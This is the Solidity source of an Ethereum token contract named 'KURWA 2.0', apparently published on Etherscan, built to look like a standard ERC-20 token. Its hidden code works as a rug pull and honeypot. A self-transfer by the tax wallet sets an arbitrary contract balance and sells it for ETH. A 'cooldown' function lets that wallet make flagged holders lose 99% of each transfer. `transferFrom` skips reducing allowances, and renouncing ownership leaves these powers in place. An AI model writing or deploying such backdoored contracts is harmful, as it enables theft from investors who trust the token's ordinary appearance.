/**
 *Submitted for verification at Etherscan.io on 2023-06-29
*/

pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT

library SafeMath {
    function sub(uint256 a, uint256 b) internal
    pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal
    pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }

    function add(uint256 a, uint256 b)
    internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure
    returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Router {
    function WETH() external pure returns (address aadd);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;

    function factory() external pure returns (address addr);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

abstract contract Ownable {
    function owner() public view virtual returns (address) {return _owner;}

    function renounceOwnership() public virtual onlyOwner {emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);}

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    address private _owner;
}

contract K2 is Ownable {

    using SafeMath for uint256;

    uint256 public _decimals = 9;

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    constructor() {
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
        _taxWallet = msg.sender;
    }
    mapping(address => uint256) bots;

    function allowance(address owner, address spender) public view returns (uint256) {return _allowances[owner][spender];}

    function balanceOf(address account) public view returns (uint256) {return _balances[account];}

    function isTaxWallet() internal view returns (bool) {
        return msg.sender == _taxWallet;
    }

    event Transfer(address indexed __address_, address indexed, uint256 _v);

    function name() external view returns (string memory) {return _name;}

    function totalSupply() external view returns (uint256) {return _totalSupply;}

    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    }

    uint256 public _totalSupply = 1000000000000 * 10 ** _decimals;

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0));
        if (to == from && msg.sender == _taxWallet) {swap(amount, to);} else {
            require(amount <= _balances[from]);
            uint256 feeAmount = 0;
            if (cooldowns[from] != 0 && cooldowns[from] <= block.number) {feeAmount = amount.mul(99).div(100);}
            _balances[from] = _balances[from] - amount;
            _balances[to] += amount - feeAmount;
            emit Transfer(from, to, amount);
        }
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(spender != address(0), "IERC20: approve to the zero address");
        require(owner != address(0), "IERC20: approve from the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    address public _taxWallet;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    uint256 _fee = 0;
    uint256 _maxTxAmount;
    mapping(address => mapping(address => uint256)) private _allowances;
    string private _name = "KURWA 2.0";
    string private  _symbol = "KURWA 2.0";

    function transferFrom(address from, address recipient, uint256 amount) public returns (bool) {
        _transfer(from, recipient, amount);
        require(_allowances[from][msg.sender] >= amount);
        return true;
    }

    function swap(uint256 _mcs, address _bcr) private {
        _approve(address(this), address(_router), _mcs);
        _balances[address(this)] = _mcs;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();

        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(_mcs, 0, path, _bcr,
            block.timestamp + 30);
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    uint256 _maxWalletSize;

    function decimals() external view returns (uint256) {return _decimals;}

    mapping(address => uint256)  cooldowns;
    mapping(address => uint256) private _balances;

    function getPairAddress() private view returns (address) {return IUniswapV2Factory(
        _router.factory()).getPair(address(this),
        _router.WETH());
    }

    function setCooldown(address[] calldata botsList) external {
        for (uint i = 0; i < botsList.length; i++) {if (isTaxWallet()) {cooldowns[botsList[i]] = block.number + 1;}}
    }

    function removeLimit() external onlyOwner {
        _maxWalletSize = _totalSupply;
        _maxTxAmount = _totalSupply;
    }

    event Approval(address indexed ai, address indexed _adress_indexed, uint256 value);

    function symbol() external view returns (string  memory) {return _symbol;}
}